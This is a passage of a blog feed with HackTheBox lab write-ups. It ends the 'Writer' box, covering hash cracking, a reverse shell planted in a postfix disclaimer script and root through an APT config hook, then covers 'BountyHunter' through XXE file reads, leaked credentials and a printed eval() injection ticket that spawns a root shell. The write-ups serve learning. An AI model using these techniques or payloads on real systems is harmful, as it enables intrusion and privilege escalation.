<p>Running <code class="language-plaintext highlighter-rouge">linPEAS</code> on the host, it found credential for the database named <code class="language-plaintext highlighter-rouge">dev</code>;</p>

<p><img src="/assets/img/20211026084907.png" alt="" /></p>

<p>I was able to connect to the <code class="language-plaintext highlighter-rouge">dev</code> database using the above credential, and found a hash for the user <strong>kyle</strong>;</p>

<p><img src="/assets/img/20211026085509.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">john</code> is unable to load the hash when attempting to crack;</p>

<p><img src="/assets/img/20211026090120.png" alt="" /></p>

<p>Using <code class="language-plaintext highlighter-rouge">haschat</code>, the password was cracked successfully, which is <code class="language-plaintext highlighter-rouge">marcoantonio</code>. Using the credential, I gained access to the account of <strong>kyle</strong> over ssh;</p>

<p><img src="/assets/img/20211026110138.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>User <strong>kyle</strong> does not have sudo access on the host. However, he is a member of <code class="language-plaintext highlighter-rouge">smbgroup</code>, and <code class="language-plaintext highlighter-rouge">filter</code>. Attempting to access the SMB service using his credentials failed. Searching the filesystem for files with group <code class="language-plaintext highlighter-rouge">smbgroup</code> and <code class="language-plaintext highlighter-rouge">filter</code>, I found an interesting match for the filter group;</p>

<p><img src="/assets/img/20211026121427.png" alt="" /></p>

<p>The file <code class="language-plaintext highlighter-rouge">/etc/postfix/disclaimer</code> looks interesting, and I have write permission to it. I had to do a bit of reading online to know what it’s used for. I found out that for any email in <code class="language-plaintext highlighter-rouge">/etc/postfix/disclaimer_addresses</code> that send or receive mail, the file <code class="language-plaintext highlighter-rouge">/etc/postfix/disclaimer</code> will be executed. There are two (2) emails in the <code class="language-plaintext highlighter-rouge">disclaimer_addresses</code> file;</p>

<p><img src="/assets/img/20211026122025.png" alt="" /></p>

<p>This means all I need to do is inject a reverse shell in the <code class="language-plaintext highlighter-rouge">disclaimer</code> file, and send a message to any of the listed email addresses to gain code execution. Using <code class="language-plaintext highlighter-rouge">nano</code> and <code class="language-plaintext highlighter-rouge">netcat</code>, I was able to achieve this after a few tries as the box is restoring the contents of the <code class="language-plaintext highlighter-rouge">disclaimer</code> file frequently;</p>

<p><img src="/assets/img/20211026123515.png" alt="" /></p>

<p><img src="/assets/img/20211026123609.png" alt="" /></p>

<p><img src="/assets/img/20211026123648.png" alt="" /></p>

<p>The user <strong>john</strong> has SSH public key authentication configured, so I shipped his private key to my attack host for a more stable access over SSH.</p>

<h4 id="john">John</h4>
<p><br /></p>

<p>I can’t list sudo permissions for this user as I still do not have his password. The user belongs to the group <em>management</em>. Searching for files belonging to the group, I got only one hit;</p>

<p><img src="/assets/img/20211026124429.png" alt="" /></p>

<p>Checking the outputs of <code class="language-plaintext highlighter-rouge">pspy</code>, I noticed a possible cron job that’s running <code class="language-plaintext highlighter-rouge">apt-get update</code>;</p>

<p><img src="/assets/img/20211026124753.png" alt="" /></p>

<p>After reading up on the purpose of <code class="language-plaintext highlighter-rouge">/etc/apt/apt.conf.d</code>, I learned that it is a directory used to store configuration files of APT. The files can be configured with commands be executed by <code class="language-plaintext highlighter-rouge">apt</code> on certain conditions. None of the existing files in the directory is writeable. But since all contents of the directory are treated as configuration files, and I have write access to directory, I created a simple configuration file (with a little help from https://blog.ikuamike.io/posts/2021/package_managers_privesc/) that execute a shell command when the <code class="language-plaintext highlighter-rouge">apt update</code> command was invoked;</p>

<p><img src="/assets/img/20211026130658.png" alt="" /></p>

<p>I then setup a listener, and wait for the update command to be executed by the cron task. It worked, and I got a reverse shell as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/20211026130820.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identfied running services using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found an admin panel by bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code></li>
  <li>Exploited an SQL Injection flaw to bypass authentication.</li>
  <li>Exploited a Command Injection flaw in the <em>Add Story</em> feature to gain a foothold into the box as <code class="language-plaintext highlighter-rouge">www-data</code></li>
  <li>Inside the box as <strong>www-data</strong>;
    <ul>
      <li>Found and cracked a hash for <strong>kyle</strong> in the backend MySQL database used by Django.</li>
      <li>The hash gave me access to the box as <strong>kyle</strong> over SSH.</li>
    </ul>
  </li>
  <li>Inside the box as <strong>kyle</strong>;
    <ul>
      <li>The user belongs to the <code class="language-plaintext highlighter-rouge">filter</code> group, and have write permission on the  file <code class="language-plaintext highlighter-rouge">/etc/postfix/disclaimer</code>, which get executed when sending/receiving emails to/from certain addresses.</li>
      <li>Injected a reverse shell into the file, and gained access to the box as the user <strong>john</strong></li>
    </ul>
  </li>
  <li>Inside the box as <strong>john</strong>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">pspy</code> identified a cron job that performs package update using <code class="language-plaintext highlighter-rouge">apt-get update</code></li>
      <li><strong>john</strong> belong to the group <em>management</em>, which gave him write access to <code class="language-plaintext highlighter-rouge">/etc/apt/apt.conf.d</code> directory.</li>
      <li>Created a malicious configuration file in <code class="language-plaintext highlighter-rouge">/etc/apt/apt.conf.d</code> that execute a reverse shell command when <code class="language-plaintext highlighter-rouge">apt-get update</code> was invoked, and gained access to the box as <strong>root</strong>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="sql injection" /><category term="sqlmap" /><category term="authentication bypass" /><category term="command injection" /><category term="enumeration" /><category term="static analysis" /><category term="arbitrary file upload" /><category term="hash cracking" /><category term="apt" /><category term="lateral movement" /><category term="python" /><category term="django" /><summary type="html"><![CDATA[Writer is definitely one of the toughest boxes I have ever solved at the time of writing this. It features a website that is vulnerable to SQL injection, which leads to authentication bypass. Once you have access, there is a feature that allows you to add and edit stories, which is vulnerable to command injection in the filename, but will be tricky to spot without using the SQL injection flaw and reading the python code of the web application.]]></summary></entry><entry><title type="html">BountyHunter - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/bountyhunter.html" rel="alternate" type="text/html" title="BountyHunter - HackTheBox" /><published>2021-11-18T00:00:00+01:00</published><updated>2021-11-18T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/bountyhunter</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/bountyhunter.html"><![CDATA[<p>Another interesting easy linux box, <strong>Bounty Hunter</strong> is a box that features a web application that is vulnerable to <em>XML External Entitiy</em> injection. This flaw allows an attacker to read local files on the server, which can be used to download a PHP file that contains a username and password, which grants access to box over SSH.</p>

<p>The privesc is a CTF-like challenge, where a custom script used to validate “tickets” is making a call to the <code class="language-plaintext highlighter-rouge">exec()</code> function of python with user-controlled data.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<ul>
  <li><em>OS</em> - Linux</li>
  <li><em>Difficulty</em> - Easy</li>
  <li><em>Points</em> - 20</li>
  <li><em>Release</em> - 24/Jul/2021</li>
  <li><em>IP</em> - 10.10.11.100</li>
</ul>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<pre><code class="language-raw">Starting Nmap 7.70 ( https://nmap.org ) at 2021-09-26 09:09 WAT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 09:09 (0:00:06 remaining)
Nmap scan report for 10.10.11.100
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.02 seconds
</code></pre>

<h4 id="ssh-server">SSH Server</h4>

<ul>
  <li>Password login for root user allowed.</li>
</ul>

<h4 id="web-server">Web Server</h4>

<p><img src="/assets/img/20210926084108.png" alt="" /></p>

<p>There is a contact us form at the bottom of the home page that does not send any of the entered data, and result in the below response;
<img src="/assets/img/20210926091518.png" alt="" /></p>

<p><img src="/assets/img/20210926084520.png" alt="" /></p>

<p><img src="/assets/img/20210926084451.png" alt="" />
<br /></p>

<p>The directory <code class="language-plaintext highlighter-rouge">/resources/</code> has listing enabled, and contains a README.txt file;</p>

<p><img src="/assets/img/20210927094950.png" alt="" /></p>

<h4 id="bounty-report-system">Bounty Report System</h4>

<p>The form is submitted by a custom JavaScript code defined in the file <code class="language-plaintext highlighter-rouge">resources/bountylog.js</code>;</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">returnSecret</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
            <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
            <span class="na">data</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span><span class="nx">data</span><span class="p">},</span>
            <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">tracker_diRbPr00f314.php</span><span class="dl">"</span>
            <span class="p">}));</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nx">bountySubmit</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xml</span> <span class="o">=</span> <span class="s2">`&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
    &lt;bugreport&gt;
    &lt;title&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#exploitTitle</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/title&gt;
    &lt;cwe&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#cwe</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/cwe&gt;
    &lt;cvss&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#cvss</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/cvss&gt;
    &lt;reward&gt;</span><span class="p">${</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#reward</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()}</span><span class="s2">&lt;/reward&gt;
    &lt;/bugreport&gt;`</span>
    <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">returnSecret</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">xml</span><span class="p">));</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#return</span><span class="dl">"</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
  <span class="p">}</span>
  <span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Generated request sample;</p>

<p><img src="/assets/img/20210926092956.png" alt="" /></p>

<p>Nothing in the JavaScript code indicate any input validation, nor  in the HTML code of the form;</p>

<p><img src="/assets/img/20210926093133.png" alt="" /></p>

<p>Since all the user-controlled parameters are directly used to construct and XML code that is passed to the server as a base64-encoded data, XML injection flaws may arise during parsing by the backend.</p>

<p>Injecting a new parameter <code class="language-plaintext highlighter-rouge">age</code>;</p>

<p><img src="/assets/img/20210926095042.png" alt="" /></p>

<p>The decoded XML;</p>

<p><img src="/assets/img/20210926095333.png" alt="" /></p>

<p>The server only responded with attributes it is interested in, and ignored the injected one, but seeing the <strong>title</strong> parameter in the response indicated our injection was successful, and didn’t break the backend parser.</p>

<p>First attempt to read a local file returned blank attributes;</p>

<p><img src="/assets/img/20210926101526.png" alt="" /></p>

<p><img src="/assets/img/20210926101656.png" alt="" /></p>

<p>Since the client-side JS code sends out a complete XML code, and not just user-given parameters, the encoded XML data generated was replaced (using an intercepting proxy) with an XML entity that will include a local file in the response;</p>

<p><img src="/assets/img/20210926225321.png" alt="" /></p>

<p><img src="/assets/img/20210926225526.png" alt="" /></p>

<p><img src="/assets/img/20210926225649.png" alt="" /></p>

<p><em>Remote File Inclusion</em> payload also worked;</p>

<p><img src="/assets/img/20210927091634.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Using the XXE vulnerability discovered on the web application, a local user account was discovered with the username <strong>codex</strong>;</p>

<p><img src="/assets/img/20210926231326.png" alt="" /></p>

<p>Attempt to read the user flag, which should be located at <code class="language-plaintext highlighter-rouge">/home/codex/user.txt</code> was unsuccessful.</p>

<p>After calling it a night and continuing the next day, the discovered <strong>codex</strong> user no longer exist in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. The account was most likely created by another tester. But the <strong>development</strong>  account still exist;</p>

<p><img src="/assets/img/20210927084001.png" alt="" /></p>

<p>The flag of this user is also not readable, and attempts to read the source code of the web application in hope of finding something kept kept failing.</p>

<p>After a while of frustration, I figured the contents of some files are likely breaking the XML syntax, so I test if the web app allows for base64 encoding of target data using PHP, and it does. The output shown below is the base64-encoded content of <code class="language-plaintext highlighter-rouge">/etc/passwd</code>;</p>

<p><img src="/assets/img/20210927103121.png" alt="" /></p>

<p><img src="/assets/img/20210927103225.png" alt="" /></p>

<p>Since I can now read all readable files, I went back to fuzzing for hidden files with <strong>ffuf</strong>, and discovered an interesting file in the web root named <code class="language-plaintext highlighter-rouge">/db.php</code>;</p>

<p><img src="/assets/img/20210927103759.png" alt="" /></p>

<p>Dumping the file using the XXE exploit revealed a credential;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="c1">// TODO -&gt; Implement login system with the database.</span>
<span class="nv">$dbserver</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"bounty"</span><span class="p">;</span>
<span class="nv">$dbusername</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
<span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s2">"m19RoAU0hP41A1sTsq6K"</span><span class="p">;</span>
<span class="nv">$testuser</span> <span class="o">=</span> <span class="s2">"test"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Since a user was previously discovered with the username <strong>development</strong>, and an SSH server is running on the host, the password was tested on the SSH server, and it was successful;</p>

<p><img src="/assets/img/20210927104356.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>development</strong> has <em>sudo</em> access to <code class="language-plaintext highlighter-rouge">/opt/skytrain_inc/ticketValidator.py</code>;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre><span class="c1">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.
</span>
<span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">loc</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".md"</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Wrong file type."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
    <span class="c1">#Evaluates a ticket to check for ireggularities.
</span>    <span class="n">code_line</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">.</span><span class="n">readlines</span><span class="p">()):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"# Skytrain Inc"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"## Ticket to "</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Destination: </span><span class="si">{</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">3</span><span class="p">:])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"__Ticket Code:__"</span><span class="p">):</span>
            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"**"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"+"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span>
                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">True</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
    <span class="c1">#DEBUG print(ticket)
</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Valid ticket."</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid ticket."</span><span class="p">)</span>
    <span class="n">ticket</span><span class="p">.</span><span class="n">close</span>

<span class="n">main</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="code-logic-for-ticketvalidatorpy">Code Logic for <em>ticketValidator.py</em></h4>

<ul>
  <li>Ask user for ticket file name.</li>
  <li>Verify that the file ends with <code class="language-plaintext highlighter-rouge">.md</code>, and open it for reading.</li>
  <li>Pass the opened file to <code class="language-plaintext highlighter-rouge">evaluate()</code>
    <ul>
      <li>Ensure the first line starts with <code class="language-plaintext highlighter-rouge"># Skytrain Inc</code></li>
      <li>Ensure the second line starts with <code class="language-plaintext highlighter-rouge">## Ticket to </code>, and print the ticket recipient.</li>
      <li>Loop until a line starting with <code class="language-plaintext highlighter-rouge">__Ticket Code:__</code> is found, and save the index of the line after it as <code class="language-plaintext highlighter-rouge">code_line</code>.
        <ul>
          <li>Ensure that the line with the index <code class="language-plaintext highlighter-rouge">code_line</code> start with <code class="language-plaintext highlighter-rouge">**</code>.</li>
          <li>Strip the <code class="language-plaintext highlighter-rouge">**</code> found in the line, and split the line at first occurrence of <code class="language-plaintext highlighter-rouge">+</code> and save the data to the left as <code class="language-plaintext highlighter-rouge">ticketCode</code>.</li>
          <li>Convert <code class="language-plaintext highlighter-rouge">ticketCode</code> to int, and test if a remainder of 4 is obtained after dividing the value by 7 <code class="language-plaintext highlighter-rouge">(ticketCode % 7 == 4)</code>.</li>
          <li>If the above is true, strip all <code class="language-plaintext highlighter-rouge">**</code> in original code line and pass it to python’s <code class="language-plaintext highlighter-rouge">eval()</code> function.</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p>The <code class="language-plaintext highlighter-rouge">eval()</code> method is dangerous when used to process unsanitized data. After testing the logic in a local python3 installation, I was able to build the below ticket that launch a bash shell when processed by the <em>Ticket Validator</em>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="c"># Skytrain Inc</span>
<span class="c">## Ticket to someHacker</span>
__Ticket Code:__
<span class="k">**</span>11 + int<span class="o">(</span><span class="nb">exec</span><span class="o">(</span><span class="s1">'import os; os.system("/bin/bash")'</span><span class="o">)</span> <span class="o">==</span> 1<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">scp</code>, I copied the above ticket to <code class="language-plaintext highlighter-rouge">/tmp/privesc_ticket.md</code> on the target host, and was able to get root on first attempt ;)</p>

<p><img src="/assets/img/20210927114358.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified SSH and HTTP services using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li><code class="language-plaintext highlighter-rouge">/log_submit.php</code> provides a form submitted in a POST request as base64-encoded XML with no client-side validation. Testing revealed an exploitable XXE vulnerability.</li>
  <li>Using the XXE flaw;
    <ul>
      <li>Identified a local user named <code class="language-plaintext highlighter-rouge">development</code>.</li>
      <li>Download source code of previously discovered PHP file <code class="language-plaintext highlighter-rouge">/db.php</code>, which contain password that allowed SSH access to the <code class="language-plaintext highlighter-rouge">development</code> account.</li>
    </ul>
  </li>
  <li>With SSH access to the <code class="language-plaintext highlighter-rouge">development</code> account;
    <ul>
      <li>Found a custom ticket validation script written in python that can be executed as root using <code class="language-plaintext highlighter-rouge">sudo</code>.</li>
      <li>Shipped the script to my attack host for analysis.
        <ul>
          <li>Discovered a dangerous call to python’s <code class="language-plaintext highlighter-rouge">eval()</code> function with user-controlled data.</li>
          <li>Crafted a malicious ticket file to spawn a bash shell on the host as <code class="language-plaintext highlighter-rouge">root</code></li>
        </ul>
      </li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="xxe" /><category term="lfi" /><category term="static analysis" /><category term="python" /><category term="command injection" /><category term="custom exploitation" /><summary type="html"><![CDATA[Another interesting easy linux box, Bounty Hunter is a box that features a web application that is vulnerable to XML External Entitiy injection. This flaw allows an attacker to read local files on the server, which can be used to download a PHP file that contains a username and password, which grants access to box over SSH.]]></summary></entry></feed>